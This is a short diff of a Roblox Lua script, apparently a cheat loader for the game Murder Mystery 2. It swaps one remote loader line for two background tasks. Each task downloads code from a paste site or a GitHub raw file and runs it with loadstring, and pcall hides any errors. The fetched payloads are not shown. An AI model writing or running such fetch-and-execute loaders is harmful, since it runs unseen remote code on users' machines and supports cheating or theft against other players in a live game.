@@ -1,1 +1,12 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjZhZDcxOTNiLWQ1N2YtNDhkOS1iYjk2LTkzMzY4NDUwNTBmNCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJzdW1tZXJldmVudCJ9fQ"))()
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet('https://cdn.sourceb.in/bins/vIvce1q4Pv/0', true))()
+    end)
+end)
+
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/hukwo/mm2/refs/heads/main/1.txt', true))()
+    end)
+end)
+
